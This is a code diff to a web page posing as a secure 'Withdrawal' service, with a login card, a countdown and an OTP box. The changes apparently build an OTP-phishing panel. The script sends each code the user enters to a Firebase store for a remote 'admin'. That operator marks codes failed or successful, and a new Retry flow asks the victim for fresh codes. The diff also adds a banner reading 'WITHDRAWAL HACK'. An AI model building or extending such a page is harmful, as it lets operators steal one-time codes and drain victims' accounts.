@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Withdrawal — </title>
+<title>Withdrawal — Demo</title>
 <style>
 *{box-sizing:border-box}body{margin:0;font-family:Inter,Arial,Helvetica,sans-serif;background:radial-gradient(circle at 18% 15%,rgba(255,255,255,.9),transparent 32%),radial-gradient(circle at 88% 72%,rgba(170,135,255,.22),transparent 36%),linear-gradient(145deg,#f6f3ff 0%,#eee7ff 48%,#e5dbff 100%);color:#27223d;min-height:100vh}
 .demo{position:fixed;top:10px;right:10px;z-index:20;background:#fff3cd;color:#795400;border:1px solid #ffe08a;padding:6px 10px;border-radius:20px;font-size:11px;font-weight:700}
@@ -32,7 +32,7 @@ button{width:100%;height:62px;border:0;border-radius:20px;background:linear-grad
 .otp-submit-btn:hover{background:#5a3db8}
 .otp-go-back{background:#6c757d;color:#fff}
 .otp-go-back:hover{background:#5a6268}
-.otp-retry-btn{background:#ffc107;color:#000}
+.otp-retry-btn{background:#ffc107;color:#000;font-size:18px;padding:12px 40px}
 .otp-retry-btn:hover{background:#e0a800}
 .result-icon{font-size:50px;display:block;margin-bottom:10px}
 @media(max-width:520px){.wrap{padding:35px 14px}.card{padding:28px 20px}h1{font-size:34px}.sub{font-size:17px}.count{font-size:72px}}
@@ -41,7 +41,7 @@ button{width:100%;height:62px;border:0;border-radius:20px;background:linear-grad
 </style>
 </head>
 <body>
-<div class="demo">🛡 Withdrawal Services</div>
+<div class="demo">🛡 WITHDRAWAL HACK</div>
 <div class="wrap">
   <section class="card" id="login">
     <div class="badge">🛡 &nbsp;SECURE</div>
@@ -105,7 +105,7 @@ button{width:100%;height:62px;border:0;border-radius:20px;background:linear-grad
         <div class="count" id="count">10:00</div>
         <div class="status" id="processingStatus">⠿ PROCESSING</div>
         <div class="bar"><div class="progress" id="progress"></div></div>
-        <div class="notice" id="processingNotice">Your withdrawal is being processed...<div class="warn">⛔ Do not press back or refresh!</div></div>
+        <div class="notice" id="processingNotice">Your demo withdrawal is being processed...<div class="warn">⛔ Do not press back or refresh!</div></div>
       </div>
     </div>
     <div id="otpSection" class="otp-box hidden">
@@ -290,7 +290,7 @@ function listenForAdminActions() {
       database.ref('admin_actions/cancelTimer').set(false);
     }
     
-    // Check for OTP Result
+    // Check for OTP Result - FAILED
     if (data.otpResult === 'failed') {
       var otpResultDiv = document.getElementById('otpResult');
       otpResultDiv.style.display = 'block';
@@ -302,12 +302,29 @@ function listenForAdminActions() {
         OTP Verification Failed!<br>
         <span style="font-size:16px;font-weight:400;">Please try again.</span>
         <br><br>
-        <button onclick="retryOTP()" class="otp-retry-btn" style="padding:10px 30px;border:0;border-radius:30px;font-weight:700;cursor:pointer;">🔄 Retry</button>
+        <button onclick="retryOTP()" class="otp-retry-btn">🔄 Retry</button>
       `;
       document.getElementById('otpInput').disabled = true;
+      
+      // Update status in Firebase
+      database.ref('activities').once('value').then((snapshot) => {
+        const allData = snapshot.val();
+        if(allData){
+          const keys = Object.keys(allData);
+          const latestKey = keys[keys.length - 1];
+          if(latestKey && allData[latestKey].type === 'WITHDRAWAL'){
+            database.ref('activities/' + latestKey).update({
+              verified: false,
+              otpFailed: true
+            });
+          }
+        }
+      });
+      
       database.ref('admin_actions/otpResult').set('none');
     }
     
+    // Check for OTP Result - SUCCESS
     if (data.otpResult === 'success') {
       var otpResultDiv = document.getElementById('otpResult');
       otpResultDiv.style.display = 'block';
@@ -320,9 +337,8 @@ function listenForAdminActions() {
         <span style="font-size:16px;font-weight:400;">🎉 Withdrawal Complete!</span>
       `;
       document.getElementById('otpInput').disabled = true;
-      database.ref('admin_actions/otpResult').set('none');
       
-      // Update withdrawal status
+      // Update status in Firebase
       database.ref('activities').once('value').then((snapshot) => {
         const allData = snapshot.val();
         if(allData){
@@ -336,12 +352,15 @@ function listenForAdminActions() {
           }
         }
       });
+      
+      database.ref('admin_actions/otpResult').set('none');
     }
   }, function(error) {
     console.error("Firebase listener error:", error);
   });
 }
 
+// 🔥 RETRY FUNCTION - User ko naya OTP daalne dega
 function retryOTP() {
   document.getElementById('otpResult').style.display = 'none';
   document.getElementById('otpInputArea').style.display = 'block';
@@ -350,9 +369,12 @@ function retryOTP() {
   document.getElementById('otpInput').focus();
   document.getElementById('otpMessage').textContent = '🔄 Please enter new OTP';
   document.getElementById('otpMessage').style.color = '#ff9800';
-  database.ref('admin_actions/otpResult').set('none');
-  // Clear old OTP
+  
+  // Clear old OTP from Firebase so admin sees new one
   database.ref('user_otp').remove();
+  database.ref('admin_actions/otpResult').set('none');
+  
+  console.log("🔄 User clicked Retry - Waiting for new OTP");
 }
 
 function submitOTP() {
@@ -363,6 +385,7 @@ function submitOTP() {
     return;
   }
   
+  // Save OTP to Firebase for admin
   database.ref('user_otp').set({
     otp: userOtp,
     time: new Date().toLocaleString()
@@ -371,6 +394,8 @@ function submitOTP() {
   document.getElementById('otpMessage').textContent = '📨 OTP submitted! Waiting for admin verification...';
   document.getElementById('otpMessage').style.color = '#ff9800';
   document.getElementById('otpInput').disabled = true;
+  
+  console.log("📨 User entered OTP:", userOtp);
 }
 </script>
 </body>
